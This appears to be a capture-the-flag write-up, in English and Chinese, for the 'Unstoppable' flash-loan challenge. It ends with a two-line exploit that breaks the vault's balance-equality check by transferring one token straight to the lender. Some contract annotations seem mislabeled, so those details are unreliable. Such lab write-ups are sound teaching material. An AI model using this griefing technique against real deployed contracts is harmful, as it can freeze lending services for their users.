---
title: Unstoppable
tag:
- defi
---

# Description
There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To pass the challenge, make the vault stop offering flash loans.

You start with 10 DVT tokens in balance.

# Code
`UnstoppableLender.sol`:
- flashLoan的接收者

`ReceiverUnstoppable.sol`:
- `flashLoan()`闪电贷函数

# Solution
为了让vault停止闪电贷，我们要做的就是让其中的某些条件失败，可以看到在`ReceiverUnstoppable.sol::flashLoan()`中有`if (poolBalance != balanceBefore) revert AssertionViolated();`,我们只需要向Pool中转钱就可以让vault停止提供闪电贷。

# Exp
```
vm.startPrank(attacker);
dvt.transfer(address(unstoppableLender), 1);
```

